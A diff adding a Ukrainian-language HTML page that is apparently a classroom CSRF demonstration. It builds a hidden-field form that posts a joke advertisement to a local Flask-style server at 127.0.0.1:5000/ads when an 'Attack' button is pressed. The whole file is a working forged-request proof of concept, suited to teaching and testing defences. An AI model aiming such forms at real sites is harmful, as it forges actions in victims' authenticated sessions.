@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>АТАКУЮ СЕРВЕР ДОДАЮ Оголошення</title>
+</head>
+<body>
+    <h1>CSRF АТАКА</h1>
+    <form method="POST" action="http://127.0.0.1:5000/ads">
+        <input type="hidden" name="title" value="уууу страшно??">
+        <input type="hidden" name="description" value="А ти не бійся">
+        <button type="submit">Атакувати</button>
+    </form>
+</body>
+</html>
